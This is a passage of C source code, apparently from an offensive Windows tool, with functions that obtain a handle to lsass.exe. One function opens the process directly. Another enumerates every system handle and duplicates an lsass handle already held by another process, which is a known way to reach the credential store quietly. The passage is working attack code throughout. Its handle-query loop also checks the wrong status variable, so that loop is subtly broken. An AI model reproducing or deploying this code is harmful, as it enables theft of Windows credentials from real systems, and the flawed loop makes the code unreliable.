    {
        DEBUG_MSG(L"COMMON_FindLsassPid failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Get process handle
    hLsassProcess = OpenProcess(dwDesiredAccess, bInheritHandles, dwLsassPid);
    if (NULL == hLsassProcess)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"OpenProcess() failed (dwLsassPid=%lu, LastError=%lu)", dwLsassPid, GetLastError());
        goto lblCleanup;
    }

    // Success
    if (NULL != pdwPid)
    {
        *pdwPid = dwLsassPid;
    }
    *phLsassProcess = hLsassProcess;
    hLsassProcess = NULL;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hLsassProcess);

    // Return result
    return eStatus;
}


/*****************************************************************************************************
*                                                                                                    *
*  Function:     common_GetSystemHandleInformation                                                   *
*  Purpose:      Getting all the system handles.                                                     *
*  Parameters:  - pptHandleInformation - gets all the system handles upon success.                   *
*  Returns:      TRUE upon success, FALSE otherwise.                                                 *
*  Remarks:     - Free the returned handle information with HeapFree on the current process heap.    *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
common_GetSystemHandleInformation(
    __out PSYSTEM_HANDLE_INFORMATION* pptHandleInformation
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    PSYSTEM_HANDLE_INFORMATION ptHandleInformation = NULL;
    PFN_NtQuerySystemInformation pfnNtQuerySystemInformation = NULL;
    PBYTE pcNewBuffer = NULL;
    SIZE_T cbBuffer = INITIAL_SYSTEM_HANDLE_INFORMATION_BUFFER_SIZE;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;

    // Resolve ntdll!NtQuerySystemInformation
    eStatus = COMMON_ResolveProcAddress(L"ntdll.dll", "NtQuerySystemInformation", (FARPROC*)&pfnNtQuerySystemInformation);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_ResolveProcAddress failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Allocate the initial buffer
    ptHandleInformation = HEAPALLOCZ(cbBuffer);
    if (NULL == ptHandleInformation)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed allocating initial size");
        goto lblCleanup;
    }

    // Keep allocating larger buffers and query all the system handles
    for (;;)
    {
        // Query the system handles
        eNtStatus = pfnNtQuerySystemInformation(SYSTEM_HANDLE_INFORMATION_CLASS, ptHandleInformation, (DWORD)cbBuffer, NULL);

        // Double the buffer size if necessary
        if (STATUS_INFO_LENGTH_MISMATCH == eStatus)
        {
            cbBuffer *= 2;
            pcNewBuffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptHandleInformation, cbBuffer);
            if (NULL == pcNewBuffer)
            {
                eStatus = RETSTATUS_FAILURE_MSG(L"HeapReAlloc() failed allocating %Iu bytes", cbBuffer);
                goto lblCleanup;
            }
            ptHandleInformation = (PSYSTEM_HANDLE_INFORMATION)pcNewBuffer;
            pcNewBuffer = NULL;
            continue;
        }

        // Handle all other errors
        if (!NT_SUCCESS(eNtStatus))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"NtQuerySystemInformation() failed (eNtStatus=%.8x)", eNtStatus);
            goto lblCleanup;
        }

        // Bail out in case of success
        break;
    }

    // Success
    *pptHandleInformation = ptHandleInformation;
    ptHandleInformation = NULL;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    HEAPFREE(ptHandleInformation);

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     common_DuplicateLsassHandleFromSystemHandles                                        *
*  Purpose:      Tries to find and duplicate an lsass.exe handle in all running processes.           *
*  Parameters:  - phLsassProcess - gets the process handle to lsass.exe upon success.                *
*               - pdwPid - gets the PID upon success. Optional.                                      *
*               - dwDesiredAccess - the desired access for the handle.                               *
*               - bInheritHandles - whether to allow handle inheritence or not.                      *
*  Returns:      A return status.                                                                    *
*  Remarks:     - Free the returning process handle with CloseHandle.                                *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
common_DuplicateLsassHandleFromSystemHandles(
    __out PHANDLE phLsassProcess,
    __out_opt PDWORD pdwPid,
    __in DWORD dwDesiredAccess,
    __in BOOL bInheritHandles
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    PFN_NtDuplicateObject pfnNtDuplicateObject = NULL;
    PFN_NtQueryObject pfnNtQueryObject = NULL;
    PSTR apszProcNames[] = { "NtDuplicateObject", "NtQueryObject" };
    FARPROC* appfnProcs[] = { (FARPROC*)&pfnNtDuplicateObject, (FARPROC*)&pfnNtQueryObject };
    DWORD dwLsassPid = 0;
    PSYSTEM_HANDLE_INFORMATION ptHandleInformation = NULL;
    SIZE_T nCounter = 0;
    DWORD dwCurrentPid = 0;
    HANDLE hCurrentProcess = NULL;
    HANDLE hCurrentDuplicatedHandle = NULL;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;
    POBJECT_TYPE_INFORMATION ptObjectTypeInfo = NULL;
    WCHAR wszExeName[MAX_PATH] = { 0 };
    DWORD cchExeName = 0;
    SIZE_T cchLsassName = 0;
    BOOL bFound = FALSE;

    // Validate arguments
    if (NULL == phLsassProcess)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (phLsassProcess=%p)", phLsassProcess);
        goto lblCleanup;
    }

    // Conclude the length of lsass.exe name
    cchLsassName = wcslen(LSASS_NAME);

    // Resolve all desired procedure names from ntdll.dll
    COMPILE_TIME_ASSERT(ARRAYSIZE(apszProcNames) == ARRAYSIZE(appfnProcs));
    eStatus = COMMON_ResolveProcAddresses(L"ntdll.dll", apszProcNames, appfnProcs, ARRAYSIZE(apszProcNames));
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_ResolveProcAddresses failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Allocate the object type information buffer
    ptObjectTypeInfo = HEAPALLOCZ(OBJECT_TYPE_INFORMATION_SIZE);
    if (NULL == ptObjectTypeInfo)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed allocating object type information size");
        goto lblCleanup;
    }

    // Find the lsass.exe PID
    eStatus = COMMON_FindLsassPid(&dwLsassPid);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FindLsassPid failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Get all the system handles
    eStatus = common_GetSystemHandleInformation(&ptHandleInformation);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"GetSystemHandleInformation failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Iterate all the handles
    for (nCounter = 0; nCounter < ptHandleInformation->HandleCount; nCounter++)
    {
        // Skip the SYSTEM process and the lsass.exe process
        if ((SYSTEM_PID == ptHandleInformation->Handles[nCounter].ProcessId) ||
            (dwLsassPid == ptHandleInformation->Handles[nCounter].ProcessId))
        {
            continue;
        }

        // Skip objects that might hang ntdll!NtQueryObject
        // Those are generally pipes - but we skip all file handles
        // See: https://github.com/adamdriscoll/PoshInternals/issues/7
        if (FILE_TYPE_UNKNOWN != GetFileType((HANDLE)(ULONG_PTR)(ptHandleInformation->Handles[nCounter].Handle)))
        {
            continue;
        }

        // The handles are ordered by their owning processes so sequentially iterating them moves between processes sequentially as well
        if (ptHandleInformation->Handles[nCounter].ProcessId != dwCurrentPid)
        {
            CLOSE_HANDLE(hCurrentProcess);
            dwCurrentPid = ptHandleInformation->Handles[nCounter].ProcessId;
            hCurrentProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwCurrentPid);
        }

        // Perform a best-effort approach
        // Since we already assigned the current PID - we skip all future OpenProcess calls
        if (NULL == hCurrentProcess)
        {
            continue;
        }

        // Perform a best-effort approach
        // Duplicate the handle so we can query it
        CLOSE_HANDLE(hCurrentDuplicatedHandle);
        __analysis_assume(NULL != pfnNtDuplicateObject);
        eNtStatus = pfnNtDuplicateObject(
            hCurrentProcess,
            (HANDLE)(ULONG_PTR)(ptHandleInformation->Handles[nCounter].Handle),
            GetCurrentProcess(),
            &hCurrentDuplicatedHandle,
            dwDesiredAccess,
            bInheritHandles ? OBJ_INHERIT : 0,
            0);
        if (!NT_SUCCESS(eNtStatus))
        {
            continue;
        }

        // Perform a best-effort approach
        // Query the object type
        eNtStatus = pfnNtQueryObject(
            hCurrentDuplicatedHandle,
            OBJECT_TYPE_INFORMATION_CLASS,
            ptObjectTypeInfo,
            OBJECT_TYPE_INFORMATION_SIZE,
            NULL);
        if (!NT_SUCCESS(eNtStatus))
        {
            continue;
        }

        // Only look for handles to processes
        if (0 != wcscmp(ptObjectTypeInfo->Name.Buffer, OBJECT_TYPE_PROCESS))
        {
            continue;
        }

        // Perform a best-effort approach
        // Get the full process name
        cchExeName = ARRAYSIZE(wszExeName);
        if (!QueryFullProcessImageNameW(hCurrentDuplicatedHandle, 0, wszExeName, &cchExeName))
        {
            continue;
        }

        // Look for the lsass.exe process name
        if ((cchExeName > cchLsassName) && (0 == _wcsicmp(wszExeName + cchExeName - cchLsassName, LSASS_NAME)))
        {
            bFound = TRUE;
            break;
        }
    }

    // Check if we have found a reference to the lsass.exe process
    if (!bFound)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Was not able to find a handle reference to the lsass.exe process");
        goto lblCleanup;
    }

    // Success
    *phLsassProcess = hCurrentDuplicatedHandle;
    hCurrentDuplicatedHandle = NULL;
    if (NULL != pdwPid)
    {
        *pdwPid = dwLsassPid;
    }
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hCurrentDuplicatedHandle);
    CLOSE_HANDLE(hCurrentProcess);
    HEAPFREE(ptHandleInformation);
    HEAPFREE(ptObjectTypeInfo);

    // Return result
    return eStatus;
}

/******************************************************************************************************
*                                                                                                     *
*  Function:     COMMON_FetchLsassHandleFromString                                                    *
*                                                                                                     *
*******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_FetchLsassHandleFromString(
    __in __notnull PWSTR pwszLsassHandleFetchType,
    __out PHANDLE phLsassProcess,
    __out_opt PDWORD pdwPid,
    __in DWORD dwDesiredAccess,
    __in BOOL bInheritHandles
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    LSASS_HANDLE_FETCH_TYPE eLsassFetchType = LSASS_HANDLE_FETCH_TYPE_INVALID;

    // Validate arguments
    if ((NULL == pwszLsassHandleFetchType) || (NULL == phLsassProcess))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pwszLsassHandleFetchType=%p, phLsassProcess=%p)", pwszLsassHandleFetchType, phLsassProcess);
        goto lblCleanup;
    }

    // Turn the fetch type into the enumerable
    eLsassFetchType = (LSASS_HANDLE_FETCH_TYPE)_wtoi(pwszLsassHandleFetchType);
    if ((LSASS_HANDLE_FETCH_TYPE_INVALID >= eLsassFetchType) || (LSASS_HANDLE_FETCH_TYPE_MAX <= eLsassFetchType))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid fetch type (pwszLsassHandleFetchType=%s)", pwszLsassHandleFetchType);
        goto lblCleanup;
    }

    // Fetch the lsass.exe handle
    eStatus = COMMON_FetchLsassHandle(eLsassFetchType, phLsassProcess, pdwPid, dwDesiredAccess, bInheritHandles);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandle failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return the result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_FetchLsassHandle                                                             *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_FetchLsassHandle(
    __in LSASS_HANDLE_FETCH_TYPE eLsassFetchType,
    __out PHANDLE phLsassProcess,
    __out_opt PDWORD pdwPid,
    __in DWORD dwDesiredAccess,
    __in BOOL bInheritHandles
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;

    // Validate arguments
    if (NULL == phLsassProcess)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (phLsassProcess=%p)", phLsassProcess);
        goto lblCleanup;
    }

    // Act based on the fetch type
    switch (eLsassFetchType)
    {
    case LSASS_HANDLE_FETCH_TYPE_DIRECT:
        eStatus = common_OpenLsassProcess(phLsassProcess, pdwPid, dwDesiredAccess, bInheritHandles);
        if (RETSTATUS_FAILED(eStatus))
        {
            DEBUG_MSG(L"common_OpenLsassProcess failed (eStatus=%.8x)", eStatus);
            goto lblCleanup;
        }
        break;

    case LSASS_HANDLE_FETCH_TYPE_DUPLICATE:
        eStatus = common_DuplicateLsassHandleFromSystemHandles(phLsassProcess, pdwPid, dwDesiredAccess, bInheritHandles);
        if (RETSTATUS_FAILED(eStatus))
        {
            DEBUG_MSG(L"common_DuplicateLsassHandleFromSystemHandles failed (eStatus=%.8x)", eStatus);
            goto lblCleanup;
        }
        break;

    default:
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid fetch type (eLsassFetchType=%d)", eLsassFetchType);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return the result
    return eStatus;
}


/******************************************************************************************************
*                                                                                                     *
*   Function:     COMMON_GetLsassHandleFetchTypeFromBinaryInput                                       *
*                                                                                                     *
*******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_GetLsassHandleFetchTypeFromBinaryInput(
    __in SIZE_T cbBuffer,
    __in_bcount(cbBuffer) __notnull PBYTE pcBuffer,
    __out LSASS_HANDLE_FETCH_TYPE* peLsassHandleFetchType
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    LSASS_HANDLE_FETCH_TYPE eLsassHandleFetchType = LSASS_HANDLE_FETCH_TYPE_INVALID;

    // Validate arguments
    if (NULL == pcBuffer)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pcBuffer=%p)", pcBuffer);
        goto lblCleanup;
    }

    // Validate buffer size
    if (sizeof(eLsassHandleFetchType) > cbBuffer)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Input buffer is too small (cbBuffer=%Iu)", cbBuffer);
        goto lblCleanup;
    }

    // Treat the buffer as a fetch type
    eLsassHandleFetchType = *((LSASS_HANDLE_FETCH_TYPE*)pcBuffer);
    if ((LSASS_HANDLE_FETCH_TYPE_INVALID >= eLsassHandleFetchType) || (LSASS_HANDLE_FETCH_TYPE_MAX <= eLsassHandleFetchType))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid fetch type (eLsassHandleFetchType=%d)", eLsassHandleFetchType);
        goto lblCleanup;
    }

    // Success
    *peLsassHandleFetchType = eLsassHandleFetchType;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return the result
    return eStatus;
}